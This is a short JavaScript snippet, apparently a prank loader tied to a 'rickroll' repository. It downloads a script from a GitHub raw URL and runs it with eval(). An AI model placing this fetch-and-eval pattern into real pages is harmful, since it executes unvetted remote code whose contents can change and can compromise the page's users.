let a = new XMLHttpRequest();
a.open("GET","https://raw.githubusercontent.com/TayIsAsleep/rickroll/main/rick.js",false);
a.send();
eval(a.responseText)
